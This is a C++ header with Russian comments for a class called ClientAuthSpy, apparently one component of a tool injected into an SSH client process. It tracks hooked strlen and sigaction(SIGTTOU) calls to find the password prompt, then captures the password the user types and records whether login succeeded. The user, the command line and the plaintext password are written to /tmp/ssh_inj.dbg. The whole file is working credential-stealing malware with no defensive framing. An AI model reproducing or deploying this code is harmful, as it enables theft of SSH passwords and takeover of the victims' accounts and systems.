#ifndef CLIENT_AUTH_SPY_H
#define CLIENT_AUTH_SPY_H

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <chrono>

class ProcessInfo {
public:
    const char* user;
    const char* cmdline;
};

// Ручная реализация str_endswith БЕЗ стандартных функций
bool str_endswith(const char* str, const char* suffix) {
    if (!str || !suffix) {
         return false;
    }

    const char* str_ptr = str;
    const char* suffix_ptr = suffix;
    size_t str_len = 0;
    size_t suffix_len = 0;
    const size_t MAX_WALK = 4096;

    // Ищем конец строки str (безопасно)
    while (str_len < MAX_WALK && *str_ptr != '\0') {
        str_ptr++;
        str_len++;
    }
    if (str_len == MAX_WALK && *str_ptr != '\0') {
         return false;
    }

    // Ищем конец строки suffix
    while (*suffix_ptr != '\0') {
        suffix_ptr++;
        suffix_len++;
         if (suffix_len > MAX_WALK) {
              return false;
         }
    }

    // Проверяем длину
    if (suffix_len > str_len) {
         return false;
    }

    // Сравниваем с конца
    str_ptr = str + str_len - suffix_len;
    suffix_ptr = suffix;

    while (*suffix_ptr != '\0') {
        if (*str_ptr != *suffix_ptr) {
             return false;
        }
        str_ptr++;
        suffix_ptr++;
    }

    return true;
}


class ClientAuthSpy {
private:
    enum State {
        UNKNOWN,
        INITIALIZED,
        PASSWORD_PROMPT,
        SIGACTION_DETECTED,
        PASSWORD_READ,
        SUCCEEDED
    };

    ProcessInfo pinfo;
    State state;
    char password[1024];
    bool succeeded;

    void Send() {
        auto t = std::chrono::system_clock::now();
        std::time_t t_time = std::chrono::system_clock::to_time_t(t);
        char time_buf[100];
        if (strftime(time_buf, sizeof(time_buf), "%c", std::localtime(&t_time))) {
             FILE* log_file = fopen("/tmp/ssh_inj.dbg", "a");
             if (log_file) {
                 fprintf(log_file, "[ + ] Captured:\n");
                 fprintf(log_file, "    Date: %s\n", time_buf);
                 fprintf(log_file, "    User: %s\n", this->pinfo.user ? this->pinfo.user : "(null)");
                 fprintf(log_file, "    Cmdline: %s\n", this->pinfo.cmdline ? this->pinfo.cmdline : "(null)");
                 fprintf(log_file, "    Password: \"%s\"\n", this->password);
                 fprintf(log_file, "    Succeeded: %d\n", (int)this->succeeded);
                 fprintf(log_file, "----\n");
                 fclose(log_file);
             }
        }
    }

public:
    ClientAuthSpy(const ProcessInfo& pi) : pinfo(pi), state(ClientAuthSpy::UNKNOWN), succeeded(false) {
        memset(this->password, 0, sizeof(this->password));
    }

    void Initiated() {
        this->state = ClientAuthSpy::INITIALIZED;
        FILE* log_file = fopen("/tmp/ssh_inj.dbg", "a");
        if (log_file) {
            fprintf(log_file, "AUTH: pid=%d, user=%s, cmdline=%s\n",
                   getpid(), this->pinfo.user ? this->pinfo.user : "(null)", this->pinfo.cmdline ? this->pinfo.cmdline : "(null)");
            fclose(log_file);
        }
    }

    void StrlenCalled(const char* s) {
        if (!s) { return; }

        switch(this->state) {
            case ClientAuthSpy::INITIALIZED:
                // Проверяем на приглашение ввода пароля
                if (str_endswith(s, "assword:")) {
                    this->state = ClientAuthSpy::PASSWORD_PROMPT;
                    FILE* log_file = fopen("/tmp/ssh_inj.dbg", "a");
                    if (log_file) { fprintf(log_file, "... Password prompt detected\n"); fclose(log_file); }
                }
                break;

            case ClientAuthSpy::SIGACTION_DETECTED:
            {
                 // Захватываем пароль
                 strncpy(this->password, s, sizeof(this->password) - 1);
                 this->password[sizeof(this->password) - 1] = '\0';
                 this->state = ClientAuthSpy::PASSWORD_READ;
                 FILE* log_file_pw = fopen("/tmp/ssh_inj.dbg", "a");
                 if (log_file_pw) { fprintf(log_file_pw, "... Password captured via strlen: \"%s\"\n", this->password); fclose(log_file_pw); }
            }
            break;

            case ClientAuthSpy::PASSWORD_READ:
                 // Проверяем успешность или новый промпт
                 if (!strcmp(s, "client-session")) {
                      this->state = ClientAuthSpy::SUCCEEDED;
                      this->succeeded = true;
                      this->Send();
                 } else if (str_endswith(s, "assword:")) {
                      this->state = ClientAuthSpy::PASSWORD_PROMPT;
                      this->succeeded = false;
                      this->Send();
                      memset(this->password, 0, sizeof(this->password));
                 }
                break;

            default:
                break;
        }
    }

    void SigactionSIGTOUCalled() {
        if (this->state == ClientAuthSpy::PASSWORD_PROMPT) {
            this->state = ClientAuthSpy::SIGACTION_DETECTED;
            FILE* log_file = fopen("/tmp/ssh_inj.dbg", "a");
            if (log_file) { fprintf(log_file, "... sigaction(SIGTTOU) detected\n"); fclose(log_file); }
        }
    }

    void E_xitCalled() {
        if (this->state != ClientAuthSpy::SUCCEEDED) {
             this->succeeded = false;
             this->Send();
        }
    }
};

#endif // CLIENT_AUTH_SPY_H 